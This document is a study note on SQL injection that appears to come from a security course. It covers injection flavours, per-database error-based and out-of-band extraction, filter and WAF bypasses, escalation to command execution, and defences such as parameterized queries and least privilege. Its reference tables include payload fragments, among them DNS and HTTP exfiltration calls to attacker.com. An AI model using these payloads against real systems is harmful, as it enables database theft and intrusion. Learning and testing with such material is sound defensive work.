# SQL Injection
Tags: #vulnerability #injection #database #day1 #day4

## What Is SQLi

When user input is concatenated into a SQL query string instead of bound as a parameter, the database parser executes the input as SQL. The attacker controls the query structure.

Sanitization is a losing strategy — you're writing your own SQL parser to defeat the real one. Multibyte encodings break escaping (CVE-2006-2753: in GBK, the second byte of a two-byte character can be a backslash, so `\'` becomes a valid character followed by an unescaped quote). Keyword stripping backfires (`UNUNIONION` → strip `UNION` → `UNION`). MySQL version comments (`/*!50000UNION*/`) hide keywords from filters but the parser still executes them. The fix is parameterized queries, which operate at the protocol level.

OWASP A03:2021 (Injection). Still top 3 after 20+ years.

## Flavors

Same concatenation bug, different output channel. How much information the page returns determines which flavor you get.

| Flavor | Channel | Bandwidth | When |
|---|---|---|---|
| UNION / in-band | Rows rendered on page | Full query result | Page displays query output |
| Error-based | DB error in response | Full value per error | App leaks error messages |
| Boolean-blind | Page diff (200/404, content change) | 1 bit | Login forms, exists-checks |
| Time-based blind | Response timing | 1 bit | Output identical — only timing leaks |
| Out-of-band | DNS/HTTP to attacker server | Full value per request | DB has outbound network |

## DB Identification

Determines everything downstream — syntax, system tables, aggregation functions, escalation primitives all differ per database. Identify first, then exploit.

| Database | Sleep | System catalog |
|---|---|---|
| MySQL | `SLEEP(5)` | `information_schema.tables`, `.columns` |
| PostgreSQL | `pg_sleep(5)` | `information_schema.tables`, `.columns` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `information_schema.tables`, `.columns` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` | `ALL_TABLES`, `ALL_TAB_COLUMNS` |
| SQLite | heavy query | `sqlite_master` |

`information_schema` is the universal map for MySQL, PostgreSQL, and MSSQL. Oracle and SQLite are the exceptions — know which catalog you need before you start extracting.

## Data Extraction by Flavor

**Error-based — per-DB tricks.** Databases are helpful — they include your data in error messages meant for debugging.

| Database | Trick | Error contains |
|---|---|---|
| PostgreSQL | `CAST((SELECT secret) AS int)` | "invalid input syntax: \<secret\>" |
| PostgreSQL | `QUERY_TO_XML(...)::text::int` | Whole table as XML |
| MySQL ≤5.7 | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret)))` | XPath error with secret |
| MySQL 8+ | `JSON_KEYS((SELECT CONCAT('{"',secret,'":1}')))` | JSON parse error |
| MSSQL | `CONVERT(int, (SELECT secret))` | Conversion error |
| Oracle | `UTL_INADDR.GET_HOST_NAME((SELECT secret FROM dual))` | Hostname lookup error |

If errors aren't visible, check for a debug gate: [[Client-Controlled IP Headers]] + [[Debug Mode Disclosure]].

**Side-channel / precomputation.** Standard blind bisection takes ~7 requests per character. Instead: if the page has any output with a numeric axis you can index into, encode the secret byte into that index. One request per full byte instead of 7. Think of it as a spy hotel — the secret picks which room to check into, you just read the guest list. Any output with >2 possible values and a controllable index is a multi-bit channel.

Aggregation solves a different problem — it's horizontal (all rows in one response). Precomputation is vertical (full byte per request). Combine both when possible.

**Aggregation — per-DB functions:**

| Database | Function |
|---|---|
| PostgreSQL | `STRING_AGG(col, ',')` |
| MySQL / SQLite | `GROUP_CONCAT(col SEPARATOR ',')` |
| MSSQL 2017+ | `STRING_AGG(col, ',')` |
| MSSQL older | `FOR XML PATH('')` |
| Oracle | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` |

MySQL gotcha: `group_concat_max_len` defaults to 1024 bytes — silently truncates without warning. PostgreSQL `QUERY_TO_XML(...)` dumps an entire table as XML in one error message.

**Out-of-band.** When the page gives zero signal, make the database courier the data. DNS is the channel that almost always works — it's rarely firewalled.

| Database | Primitive | Channel |
|---|---|---|
| MySQL (Windows) | `LOAD_FILE('\\\\<data>.attacker.com\\x')` | DNS via UNC |
| PostgreSQL | `COPY ... TO PROGRAM 'curl ...'` | HTTP (superuser) |
| PostgreSQL | `dblink('host=<data>.attacker.com ...')` | DNS via libpq |
| MSSQL | `xp_dirtree '\\\\<data>.attacker.com\\x'` | DNS+SMB |
| Oracle | `UTL_HTTP.REQUEST(...)` | HTTP |
| Oracle | `UTL_INADDR.GET_HOST_NAME(...)` | DNS only |

Receivers: Burp Collaborator or `interactsh`. When OOB fails (egress firewall, missing privs): fall back to time-based.

**Context matters:** numeric injection points don't need quotes — `WHERE id = 1 UNION SELECT...` works directly. String context requires closing the quote first.

## Filters and Filter Bypasses

A filter is a list of specific things the developer thought to block. Everything else passes.

**Shape bypass — dead zones.** Every input shape has zones the validator cares about and zones it ignores. If those zones don't overlap with what SQL needs, the payload fits in both.

| Shape | Dead zone | Example |
|---|---|---|
| Email regex | Before `@` | `' or 1=1--@x.com` |
| URL | Path/query/fragment | `https://x.com/?'or+1=1--` |
| Alphanumeric filter | Hex literals | `0x61646D696E` = `'admin'` (MySQL) |

**Java `matches()` vs `find()`:** `matches()` validates the entire string — partial payloads in a longer valid string pass through. `find()` searches for the pattern anywhere. Developers confuse these constantly — it's a free lunch.

**Bypass reference:**

| Blocked | Alternative |
|---|---|
| Spaces | `/**/`, `%0a`, `%09` |
| Quotes (PG) | `$$admin$$` (dollar-quoting) |
| Quotes (MySQL) | `0x61646D696E` or `CHAR(97,100,...)` |
| Quotes (MSSQL) | `CHAR(97)+CHAR(100)+...` |
| Quotes (Oracle) | `q'[admin]'` or `CHR(97)\|\|CHR(100)\|\|...` |
| Keywords | Case mixing, `UN/**/ION`, `/*!50000UNION*/` |
| Double-encoding | `%2527` → `%27` → `'` (when filter runs before URL decoding) |

**WAF parser mismatch:** WAFs parse HTTP, databases parse SQL. These are different parsers with different grammars — the gap between them is where bypasses live.

**Stacked queries:**

| Database + Driver | Stacking? |
|---|---|
| PostgreSQL + psycopg2 | Yes |
| MySQL + JDBC | No (needs `allowMultiQueries=true`) |
| MSSQL + most drivers | Yes |
| Oracle | No |

## SQLi → RCE

A database is a Linux process running as an OS user. Superuser SQLi doesn't just give you data — it gives you that process's capabilities. These are features, not bugs.

```
LEVEL 0  ─ Confirm            (' breaks query)
LEVEL 1  ─ Read data          (UNION/error/blind)
LEVEL 2  ─ Read OS files      (COPY FROM / LOAD_FILE)
LEVEL 3  ─ Write OS files     (COPY TO / INTO OUTFILE / large objects)
LEVEL 4  ─ Execute commands   (COPY FROM PROGRAM / xp_cmdshell / UDF)
LEVEL 5  ─ Interactive shell  (reverse shell → privesc)
```

**Gate check:** `SELECT current_user, current_setting('is_superuser');` — if `on`, levels 2–5 are minutes of typing. Default installs ship superuser.

**Key primitives:** PostgreSQL `COPY FROM PROGRAM` (CVE-2019-9193, closed as "this is a feature"), MSSQL `xp_cmdshell`, MySQL `LOAD_FILE`/`INTO OUTFILE`/UDF, Oracle `DBMS_SCHEDULER`. PostgreSQL large objects (`lo_import`/`lo_export`) write arbitrary binary — including compiled `.so` for C extensions.

**PoLP determines blast radius.** The same SQLi bug is a P3 info-leak or a P0 RCE depending entirely on the DB role's privileges. The escalation is gated on `is_superuser`, not on the injection itself. See [[Principle of Least Privilege]].

## Why SQLi Still Exists

Parameterized queries solve the parsing confusion at the wire level. `COM_STMT_PREPARE` sends the query structure, `COM_STMT_EXECUTE` sends data as typed binary in a separate message — the parser is done before data arrives. This isn't escaping (which still sends one string and hopes the parser handles it). It's complete channel separation. But you can't parameterize SQL structure — table names, column names, ORDER BY direction, operators. These need allowlisting against a hardcoded set of valid values.

ORMs prevent SQLi by generating parameterized queries — until developers reach for `.raw()`, `.extra()`, `text()`, `createNativeQuery()`, `knex.raw()`. These escape hatches are where SQLi lives in modern codebases.

**Second-order:** input stored safely (parameterized INSERT), retrieved later and concatenated into a different query. Spans code paths, spans time. The false assumption: "data from our own database is safe."

**Real breaches** — Sony 2011 (plaintext passwords leaked), Heartland 2008 (130M payment cards), TalkTalk 2015 (teenager with sqlmap), MOVEit 2023 (Cl0p mass exploitation via SQLi in file transfer app). Same fundamental bug, 15 years apart.

Default installs ship superuser credentials in the app connection string. The fix isn't better sanitization — it's PoLP at the DB layer. If this credential leaked tomorrow, what could the attacker do?

## Finding SQLi

### Log Observation

When you have access to query logs (white-box, lab, or post-compromise), tail them while sending requests. The log shows exactly what SQL the parser received — it's ground truth.

`$1` / `?` / `@p1` in the log = parameterized = safe. Your input appearing as a quoted literal = concatenated = investigate. Your input appearing cleaned or modified = sanitization layer, dig deeper.

| Database | Enable log | Parameterized marker |
|---|---|---|
| PostgreSQL | `log_statement = 'all'` | `$1` |
| MySQL | `SET GLOBAL general_log = 'ON'` | `?` |
| MSSQL | SQL Profiler / Extended Events | `@p1` |
| Oracle | `AUDIT` policies / trace 10046 | `:1` |

The loop: read source → find candidate sink → send request with marker input → check log → confirm parameterized or concatenated → if concatenated, send single quote → watch for syntax error in log → build payload.

### Black-Box

**DB identification first** — sleep functions determine which DB you're talking to. Syntax differs for everything after this.

**Technique determination — always pick the highest-bandwidth channel:**

1. UNION SELECT with NULLs — see output? → UNION-based
2. Inject syntax error — see DB error? → Error-based
3. `AND 1=1` vs `AND 1=2` — page differs? → Boolean-blind
4. `AND SLEEP(5)` — timing differs? → Time-blind
5. DNS/HTTP callback — received? → OOB

Before defaulting to bisection (~7 req/char), check: does the page have any output with >2 possible values and a controllable index? That's a multi-bit side channel — one request per byte.

### Red Flags

- Single quote `'` causes 500 error or different behavior
- DB error messages visible on page
- Different HTTP status for valid vs invalid query logic
- `ORDER BY 1` works but `ORDER BY 100` errors
- WAF blocks `UNION SELECT` but not `/*!50000UNION*//*!50000SELECT*/`
- Homemade regex or blacklist in front of query
- `matches()` in Java filter code
- Filters running before URL decoding (double-encoding opportunity)
- Page renders rows by ID or result counts alongside a controllable query (side-channel)
- `+` in a Java SQL string — primary code review red flag for concatenation

**Front door locked, try side door** — `/login` is the most audited endpoint. `/forgot-password`, `/signup`, `/reset`, `/api/v1/*` are where bugs live.

**Multi-finding density** — one 40-line controller function can have 6 findings. Read the whole function, map the whole graph. Don't stop at the SQLi.

## Chains

- [[Client-Controlled IP Headers]] — spoof header to flip debug gate, upgrade blind → error-based
- [[Debug Mode Disclosure]] — debug catch blocks turn DB errors into your output channel
- [[Database as a Process]] — why every SQLi against a superuser connection becomes RCE
- [[Principle of Least Privilege]] — the only thing that contains blast radius at every level

## My Notes
